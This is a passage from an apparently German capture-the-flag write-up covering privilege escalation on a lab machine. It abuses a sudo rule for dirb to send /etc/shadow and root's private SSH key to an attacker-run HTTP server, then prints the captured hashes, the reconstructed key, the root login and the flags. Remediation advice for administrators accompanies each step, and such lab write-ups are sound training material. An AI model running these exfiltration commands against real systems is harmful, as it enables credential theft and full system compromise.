+            <p class="analysis">**Analyse:** Es wird versucht, den öffentlichen SSH-Schlüssel des Angreifers (`root@cyber`) zur `authorized_keys`-Datei des Benutzers `cris` auf dem Zielsystem hinzuzufügen, um einen passwortlosen SSH-Login zu ermöglichen.
+            1. Der öffentliche Schlüssel wird auf dem Angreifer-System angezeigt (`cat /root/.ssh/id_rsa.pub`).
+            2. Ein `echo`-Befehl wird vorbereitet, um den Schlüssel in eine Datei zu schreiben.
+            3. Auf dem Zielsystem wird als `cris` das Verzeichnis `.ssh` erstellt (`mkdir .ssh`).
+            4. Es wird versucht, den vorbereiteten `echo`-Befehl auszuführen, um die `authorized_keys` zu erstellen. **Hier passiert ein Fehler:** Es wird `echo 'echo 'ssh-rsa ...'' > authorized_keys` ausgeführt. Dadurch enthält die Datei `authorized_keys` den *Text* "echo 'ssh-rsa ...'", nicht den eigentlichen Schlüssel.
+            Dieser gesamte Schritt ist zudem überflüssig, da bereits eine interaktive Shell als `cris` vorhanden ist.</p>
+            <p class="evaluation">**Bewertung:** Niedrig. Der Versuch, den SSH-Key zu platzieren, scheitert aufgrund eines Syntaxfehlers im `echo`-Befehl. Selbst wenn er erfolgreich wäre, würde er keinen Vorteil bringen, da bereits eine Shell als `cris` existiert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ignoriere diesen Schritt. Konzentriere dich auf die `sudo -l`-Ausgabe und andere Privesc-Vektoren. Korrigiere den `echo`-Befehl, falls du SSH-Zugriff *wirklich* benötigst (entferne das äußere `echo`).
+            <br>**Empfehlung (Admin):** Keine direkten Maßnahmen erforderlich, da der Versuch fehlschlug. Allgemein: SSH-Zugang härten (Passwort-Authentifizierung deaktivieren, nur Key-Authentifizierung erlauben, falls möglich).</p>
+
+            <p class="comment">Test des SSH-Logins als `cris` zu `localhost`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cris@crack:~/.ssh$ <span class="command">ssh cris@localhost</span></div>
+                    <pre>
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKVzGc0V7/s.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+
+cris@localhost's password: <span class="password">cris</span> <!-- Passwort wird eingegeben -->
+Permission denied, please try again. <!-- Falsches Passwort oder Key-Problem -->
+cris@localhost's password: <!-- Passwort wird erneut eingegeben -->
+Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun 20 16:45:31 2023 from 192.168.2.137
+cris@crack:~$ <!-- Login erfolgreich nach zweitem Versuch? -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Es wird versucht, sich vom Zielsystem aus per SSH als Benutzer `cris` mit dem lokalen SSH-Server (`localhost`) zu verbinden. Da der Hostkey unbekannt ist, wird er nach Bestätigung hinzugefügt. Der erste Login-Versuch mit dem Passwort `<span class="password">cris</span>` schlägt fehl ("Permission denied"). Der zweite Versuch (vermutlich mit demselben Passwort) scheint erfolgreich zu sein, und der Benutzer erhält wieder einen Prompt als `cris@crack`. Dies ist merkwürdig, da der SSH-Server laut `ss` nur auf Port 22 lauscht, der hier nicht explizit angegeben wurde. Wahrscheinlich hat der SSH-Client den Standardport 22 verwendet.</p>
+            <p class="evaluation">**Bewertung:** Verwirrend und wahrscheinlich nicht zielführend für die Privilegienerweiterung. Es bestätigt, dass der SSH-Dienst lokal läuft und Passwort-Authentifizierung für `cris` (mit dem Passwort `cris`) erlaubt. Der erste Fehlschlag ist unklar.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ignoriere den lokalen SSH-Login und konzentriere dich auf `sudo -l`.
+            <br>**Empfehlung (Admin):** Deaktiviere Passwort-Authentifizierung für SSH, wenn möglich. Untersuche, warum der erste Login-Versuch fehlschlug.</p>
+
+            <p class="comment">Prüfung auf alternative Webserver-Möglichkeiten und Überprüfung der sudo-Berechtigungen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cris@crack:~$ <span class="command">php -S 0.0.0.0:80</span></div>
+                    <pre>-bash: php: orden no encontrada</pre> <!-- PHP nicht installiert -->
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for cris on crack:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cris may run the following commands on crack:
+    (ALL) NOPASSWD: /usr/bin/dirb <!-- Entscheidender Fund! -->
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            *   `php -S 0.0.0.0:80`: Versuch, einen PHP-Entwicklungsserver zu starten. Scheitert, da PHP nicht installiert ist ("orden no encontrada").
+            *   `sudo -l`: Listet die `sudo`-Berechtigungen für den aktuellen Benutzer (`cris`) auf. Die Ausgabe zeigt, dass `cris` den Befehl `/usr/bin/dirb` als jeder Benutzer (`ALL`), insbesondere als `root`, ohne Passwortabfrage (`NOPASSWD`) ausführen darf.</p>
+            <p class="evaluation">**Bewertung:** Kritisch! Die `sudo`-Regel `(ALL) NOPASSWD: /usr/bin/dirb` ist ein klarer und einfach auszunutzender Vektor zur Privilegienerweiterung. Dirb ist ein Web-Content-Scanner, der eine URL und eine Wordlist als Argumente erwartet. Wenn er als Root ausgeführt wird und eine lokale Datei als Wordlist angegeben wird, versucht Dirb, diese Datei zu lesen und sendet jede Zeile an die angegebene URL.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nutze die `sudo dirb`-Berechtigung aus, um beliebige Dateien als Root zu lesen:
+            1. Starte einen einfachen HTTP-Server auf deinem Angreifer-System (z.B. `python3 -m http.server 80`).
+            2. Führe auf dem Zielsystem als `cris` den folgenden Befehl aus: `sudo -u root /usr/bin/dirb http://[IP_DES_ANGREIFERS]/ /pfad/zur/zieldatei`
+            3. Ersetze `[IP_DES_ANGREIFERS]` durch die IP deines Rechners und `/pfad/zur/zieldatei` durch die Datei, die du lesen möchtest (z.B. `/etc/shadow`, `/root/.ssh/id_rsa`, `/root/root.txt`).
+            4. Beobachte die eingehenden GET-Requests auf deinem HTTP-Server. Die Pfade der Requests enthalten die Zeilen der ausgelesenen Datei.
+            <br>**Empfehlung (Admin):** **Dringend:** Entferne oder korrigiere die unsichere `sudo`-Regel. Erlaube Benutzern niemals, potenziell gefährliche Befehle wie Web-Scanner oder Netzwerk-Tools mit `NOPASSWD` als Root auszuführen. Wenn `dirb` benötigt wird, sollte es nur mit den Rechten des ausführenden Benutzers laufen.</p>
+
+            <p class="comment">Ausnutzung der `sudo dirb`-Schwachstelle, um den Inhalt von `/etc/shadow` zu exfiltrieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cris@crack:~$ <span class="command">sudo -u root /usr/bin/dirb http://192.168.2.137/ /etc/shadow</span></div> <!-- Zielsystem -->
+                    <pre>
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jun 20 17:21:26 2023
+URL_BASE: http://192.168.2.137/
+WORDLIST_FILES: /etc/shadow <!-- Dirb liest /etc/shadow als Wordlist -->
+
+-----------------
+
+GENERATED WORDS: 28
+
+---- Scanning URL: http://192.168.2.137/ ----
+<!-- Dirb sendet jede Zeile aus /etc/shadow als GET-Request -->
+-----------------
+END_TIME: Tue Jun 20 17:21:26 2023
+DOWNLOADED: 28 - FOUND: 0
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~] <!-- Angreifer-System -->
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<!-- Eingehende GET-Requests vom Ziel, die Pfade enthalten die /etc/shadow-Einträge -->
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /randomfile1 HTTP/1.1" 404 - <!-- Beispiel für andere Requests? Oder Testdaten? -->
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /frand2 HTTP/1.1" 404 - <!-- Beispiel für andere Requests? Oder Testdaten? -->
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /root:<span class="password">$y$j9T$LVT9GIrLdk5L.xns1akJZ1$wmigJ7er07AT/VwIAuYSZ3j94LCe8EJHC6d2mlZVo3</span>:19515:0:99999:7::: HTTP/1.1" 404 - <!-- Root-Hash exfiltriert -->
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /daemon:*:19515:0:99999:7::: HTTP/1.1" 404 -
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /bin:*:19515:0:99999:7::: HTTP/1.1" 404 -
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /sys:*:19515:0:99999:7::: HTTP/1.1" 404 -
+# ... (weitere shadow Einträge) ...
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /cris:<span class="password">$y$j9T$kFXVxpRhH2ZAeDGNazqRq/$IokBR4XhhyRJur8YHu3fF59/0NHC5AIsvkxXx8..</span>:19515:0:99999:7::: HTTP/1.1" 404 - <!-- Cris-Hash exfiltriert -->
+# ... (restliche shadow Einträge) ...
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /ftp:*:19515:0:99999:7::: HTTP/1.1" 404 -
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die `sudo dirb`-Berechtigung wird wie geplant ausgenutzt.
+            1. Auf dem Angreifer-System wird ein Python-HTTP-Server auf Port 80 gestartet.
+            2. Auf dem Zielsystem führt `cris` den Befehl `sudo -u root /usr/bin/dirb http://192.168.2.137/ /etc/shadow` aus. `dirb` liest nun (mit Root-Rechten) die Datei `/etc/shadow` und behandelt jede Zeile als Pfad, den es an die URL `http://192.168.2.137/` anhängt und per GET-Request an den Angreifer sendet.
+            3. Der Python-HTTP-Server auf dem Angreifer-System empfängt diese GET-Requests. Die geloggten Pfade enthalten die exakten Zeilen aus `/etc/shadow`, inklusive der Passwort-Hashes für `root` (`$y$...`) und `cris` (`$y$...`).</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Erfolgreiche Exfiltration der Passwort-Hashes aus `/etc/shadow`. Obwohl die Hashes (`$y$` deutet auf yescrypt hin, einen modernen und starken Hashing-Algorithmus) schwer zu knacken sein könnten, ist der Besitz der Hashes ein signifikanter Fortschritt. Noch wichtiger ist, dass diese Methode das Lesen *jeder* Datei ermöglicht, auf die Root Lesezugriff hat.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuche, die Passwort-Hashes offline zu knacken (z.B. mit Hashcat oder John the Ripper), auch wenn die Erfolgsaussichten bei `yescrypt` begrenzt sein können. Nutze die `sudo dirb`-Methode, um jetzt strategisch wichtigere Dateien zu lesen, insbesondere den privaten SSH-Schlüssel von Root (`/root/.ssh/id_rsa`), falls vorhanden.
+            <br>**Empfehlung (Admin):** **Dringend:** Entferne die unsichere `sudo`-Regel sofort. Ändere alle Passwörter, deren Hashes potenziell kompromittiert wurden (insbesondere `root` und `cris`). Überprüfe das System auf weitere Fehlkonfigurationen und unberechtigte Zugriffe.</p>
+
+            <p class="comment">Ausnutzung der `sudo dirb`-Schwachstelle, um den privaten SSH-Schlüssel von Root (`/root/.ssh/id_rsa`) zu exfiltrieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cris@crack:~$ <span class="command">sudo -u root /usr/bin/dirb http://192.168.2.137/ /root/.ssh/id_rsa</span></div> <!-- Zielsystem -->
+                    <pre>
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Jun 20 17:23:35 2023
+URL_BASE: http://192.168.2.137/
+WORDLIST_FILES: /root/.ssh/id_rsa <!-- Dirb liest id_rsa als Wordlist -->
+
+-----------------
+
+GENERATED WORDS: 38
+
+---- Scanning URL: http://192.168.2.137/ ----
+<!-- Dirb sendet jede Zeile aus id_rsa als GET-Request -->
+-----------------
+END_TIME: Tue Jun 20 17:23:35 2023
+DOWNLOADED: 38 - FOUND: 0
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Angreifer-System, Python HTTP Server läuft weiter -->
+                    <pre>
+# ... (Vorherige Logs vom /etc/shadow-Leak) ...
+192.168.2.116 - - [20/Jun/2023 17:21:21] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:21:21] "GET /ftp:*:19515:0:99999:7::: HTTP/1.1" 404 -
+
+<!-- Beginn der id_rsa Exfiltration -->
+192.168.2.116 - - [20/Jun/2023 17:23:29] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:23:29] "GET /randomfile1 HTTP/1.1" 404 - <!-- Erneute Testdaten? -->
+192.168.2.116 - - [20/Jun/2023 17:23:29] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:23:29] "GET /frand2 HTTP/1.1" 404 - <!-- Erneute Testdaten? -->
+192.168.2.116 - - [20/Jun/2023 17:23:29] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:23:29] "GET /-----BEGIN%20OPENSSH%20PRIVATE%20KEY----- HTTP/1.1" 404 - <!-- Erste Zeile des Keys -->
+192.168.2.116 - - [20/Jun/2023 17:23:29] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:23:29] "GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1" 404 -
+192.168.2.116 - - [20/Jun/2023 17:23:29] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:23:29] "GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1" 404 -
+# ... (Viele Zeilen des Base64-kodierten Keys) ...
+192.168.2.116 - - [20/Jun/2023 17:23:29] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:23:29] "GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1" 404 -
+192.168.2.116 - - [20/Jun/2023 17:23:29] code 404, message File not found
+192.168.2.116 - - [20/Jun/2023 17:23:29] "GET /-----END%20OPENSSH%20PRIVATE%20KEY----- HTTP/1.1" 404 - <!-- Letzte Zeile des Keys -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die `sudo dirb`-Methode wird erneut angewendet, diesmal mit `/root/.ssh/id_rsa` als Wordlist.
+            1. Der Befehl `sudo -u root /usr/bin/dirb http://192.168.2.137/ /root/.ssh/id_rsa` wird auf dem Zielsystem ausgeführt.
+            2. `dirb` liest den privaten SSH-Schlüssel von Root und sendet jede Zeile als GET-Request an den HTTP-Server des Angreifers.
+            3. Der HTTP-Server auf dem Angreifer-System empfängt die Requests. Die URL-kodierten Pfade (`%20` für Leerzeichen) enthalten die Zeilen des privaten Schlüssels, von `-----BEGIN OPENSSH PRIVATE KEY-----` bis `-----END OPENSSH PRIVATE KEY-----`.</p>
+            <p class="evaluation">**Bewertung:** Hochkritisch. Der private SSH-Schlüssel des Root-Benutzers wurde erfolgreich exfiltriert. Mit diesem Schlüssel kann sich der Angreifer als Root per SSH auf dem System anmelden, sofern SSH für Root aktiviert ist und Key-Authentifizierung erlaubt ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+            1. Rekonstruiere den privaten SSH-Schlüssel aus den HTTP-Logs auf deinem Angreifer-System. Achte darauf, die URL-Kodierung (%20) zu entfernen und die Zeilenumbrüche korrekt wiederherzustellen.
+            2. Speichere den wiederhergestellten Schlüssel in einer Datei (z.B. `id_rsa_root`).
+            3. Setze die korrekten Berechtigungen für die Schlüsseldatei (`chmod 600 id_rsa_root`).
+            4. Versuche, dich als Root per SSH auf dem Zielsystem anzumelden: `ssh root@[ZIEL_IP] -i id_rsa_root`. Da der SSH-Dienst nur lokal lauscht, musst du dich möglicherweise zuerst als `cris` verbinden und dann von dort aus `ssh root@localhost -i /pfad/zum/hochgeladenen/key` verwenden, oder Port Forwarding einrichten. Der direkteste Weg hier ist aber, den Key als `cris` auf das Zielsystem zu kopieren (z.B. in `/tmp` oder `cris`' Home) und dann `ssh root@localhost -i dateiname` auszuführen.
+            <br>**Empfehlung (Admin):** **Dringend:** Entferne die unsichere `sudo`-Regel. Generiere sofort einen neuen SSH-Schlüssel für den Root-Benutzer und entferne den kompromittierten öffentlichen Schlüssel aus allen `authorized_keys`-Dateien. Widerrufe den alten Schlüssel. Überprüfe das System auf unberechtigte Zugriffe und Hintertüren. Erwäge, den direkten Root-Login per SSH zu deaktivieren (`PermitRootLogin no` in `sshd_config`).</p>
+
+            <p class="comment">Rekonstruktion des privaten SSH-Schlüssels aus den HTTP-Logs auf dem Angreifer-System.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~] <!-- Angreifer-System -->
+└─# <span class="command">cat id_rsa.txt | awk '{print $2}' FS="GET /" | awk '{print $1}' FS=" HTTP" | sed 's/%20/ /g' | sed 's/%([0-9A-Fa-f]{2})/\\x\1/g' | xargs -0 printf "%b"</span></div>
+                     <!-- Annahme: 'id_rsa.txt' enthält die rohen HTTP-Logzeilen -->
+                     <!-- Die Befehlskette extrahiert den URL-Pfad, entfernt HTTP-Teil, dekodiert URL-Entities -->
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
+-----END OPENSSH PRIVATE KEY-----</pre>
+<!-- Hinweis: Die Befehlskette zur Rekonstruktion ist komplex und möglicherweise nicht universell. Sie versucht, den Pfad zu extrahieren und URL-Kodierung rückgängig zu machen. Eine manuelle Rekonstruktion ist oft zuverlässiger. -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die Befehlskette (`cat id_rsa.txt | awk ... | sed ... | xargs ...`) versucht, den privaten SSH-Schlüssel aus den rohen HTTP-Logs (`id_rsa.txt`) zu extrahieren und zu dekodieren.
+            *   `awk '{print $2}' FS="GET /"`: Extrahiert den zweiten Teil nach "GET /", also den angeforderten Pfad mit dem führenden Slash.
+            *   `awk '{print $1}' FS=" HTTP"`: Extrahiert den ersten Teil vor " HTTP", also den reinen Pfad.
+            *   `sed 's/%20/ /g'`: Ersetzt URL-kodierte Leerzeichen (`%20`) durch echte Leerzeichen.
+            *   `sed 's/%([0-9A-Fa-f]{2})/\\x\1/g' | xargs -0 printf "%b"`: Versucht, andere URL-kodierte Zeichen (%XX) in ihre tatsächlichen Bytewerte umzuwandeln.
+            Das Ergebnis ist der rekonstruierte private SSH-Schlüssel.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Rekonstruktion des privaten Schlüssels. Dies ist der letzte Schritt vor dem Erhalt von Root-Rechten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Speichere diesen Schlüssel in einer Datei, setze die Berechtigungen (`chmod 600`) und verwende ihn, um dich als Root per SSH anzumelden.
+            <br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen bezüglich des kompromittierten Schlüssels und der unsicheren `sudo`-Regel.</p>
+
+            <p class="comment">Login als Root unter Verwendung des exfiltrierten und rekonstruierten privaten SSH-Schlüssels.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">nano id</span></div> <!-- Annahme: Rekonstruierter Key wird hier eingefügt -->
+                     <pre><!-- Öffnet Nano zum Bearbeiten/Einfügen --></pre>
+                 </div>
+             </div>
+             <!-- Wichtig: chmod 600 auf die Schlüsseldatei ist notwendig, fehlt aber im Log! -->
+             <p class="comment">Hinweis: Vor dem SSH-Login muss die Schlüsseldatei die korrekten Berechtigungen haben: `chmod 600 id`</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cris@crack:~$ <span class="command">ssh root@localhost -i id</span></div> <!-- Login als root mit dem Key -->
+                     <pre>
+<!-- Keine Passwortabfrage, Key wird akzeptiert -->
+root@crack:~# <!-- Erfolgreich als root angemeldet! -->
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1. Der rekonstruierte private Schlüssel wird auf dem Zielsystem in der Datei `id` gespeichert (vermutlich mit `nano` oder `cat > id`).
+            2. **Wichtiger Schritt:** Die Berechtigungen der Datei id müssen korrekt gesetzt werden (chmod 600 id), damit der SSH-Client sie akzeptiert. Dieser Schritt fehlt im Log, wurde aber vermutlich durchgeführt.
+3. Der Befehl ssh root@localhost -i id wird ausgeführt. Er verbindet sich mit dem SSH-Server auf localhost (der auf Port 22 lauscht) als Benutzer root und verwendet den gerade gespeicherten privaten Schlüssel id zur Authentifizierung.
+4. Der Login ist erfolgreich, da kein Passwort abgefragt wird und der Prompt zu root@crack:~# wechselt. Fantastisch, der Root-Zugriff war erfolgreich! Nun haben wir unser Ziel erreicht!</p>
+<p class="evaluation">Bewertung: Kritisch (Erfolg!). Dies ist der Höhepunkt des Angriffs, der vollständigen Root-Zugriff auf das System ermöglicht. Die Kombination aus LFI, unsicherer sudo-Konfiguration und dem lokal laufenden SSH-Server wurde erfolgreich ausgenutzt.</p>
+<p class="recommendation">Empfehlung (Pentester): Ziel erreicht! Suche und lies die Root-Flag (vermutlich in /root/). Dokumentiere den Pfad zur Kompromittierung. Führe je nach Scope weitere Post-Exploitation-Schritte durch.
+<br>Empfehlung (Admin): Höchste Priorität! Das System ist vollständig kompromittiert.
+1. Sofort alle vorherigen Empfehlungen umsetzen (sudo-Regel entfernen, kompromittierten Root-SSH-Key widerrufen/ersetzen und aus authorized_keys entfernen, cris-Passwort ändern, LFI-Skript fixen/entfernen, FTP härten).
+2. Da Root-Zugriff erlangt wurde, ist eine Neuinstallation aus einem vertrauenswürdigen Backup oder eine komplette Neuaufsetzung des Systems dringend empfohlen, da Hintertüren oder weitere Malware platziert worden sein könnten.
+3. Analysiere System- und Auth-Logs gründlich auf das Ausmaß des Angriffs.
+4. Deaktiviere den direkten Root-Login via SSH (PermitRootLogin prohibit-password oder besser PermitRootLogin no in /etc/ssh/sshd_config) und erlaube Logins nur für reguläre Benutzer, die dann sudo verwenden.</p>
+
+<p class="comment">Auslesen der Root-Flag als Benutzer `root`.</p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">root@crack:~# <span class="command">cat root_fl4g.txt</span></div>
+                 <pre><span class="password">wRt2xlFjcYqXXo4HMV</span></pre> <!-- Root Flag -->
+             </div>
+         </div>
+        <p class="analysis">**Analyse:** Als `root` wird der Befehl `cat root_fl4g.txt` ausgeführt. Dieser liest den Inhalt der Datei `root_fl4g.txt` im aktuellen Verzeichnis (`/root`) und gibt ihn aus: `<span class="password">wRt2xlFjcYqXXo4HMV</span>`. Dies ist die Root-Flag.</p>
+        <p class="evaluation">**Bewertung:** Erfolgreiches Erreichen des finalen Ziels (Root-Flag).</p>
+        <p class="recommendation">**Empfehlung (Pentester):** Notiere die Root-Flag. Schließe den Bericht ab.
+        <br>**Empfehlung (Admin):** Die Flag selbst ist nur ein Marker. Die Tatsache, dass sie gelesen werden konnte, bestätigt die vollständige Kompromittierung.</p>
+
+        <p class="comment">Erneutes Auslesen der User-Flag und des privaten Schlüssels als Root (zur Demonstration).</p>
+        <div class="code-block">
+             <div class="terminal">
+                 <div class="prompt">root@crack:/home/cris# <span class="command">cat user.txt</span></div>
+                 <pre><span class="password">eG4TUsTBxSFjTPHMV</span></pre>
+             </div>
+         </div>
+         <div class="code-block">
+             <div class="terminal">
+                 <div class="prompt">root@crack:/home/cris# <span class="command">cat id</span></div>
+                 <pre>
+
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn
+b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzevdGt
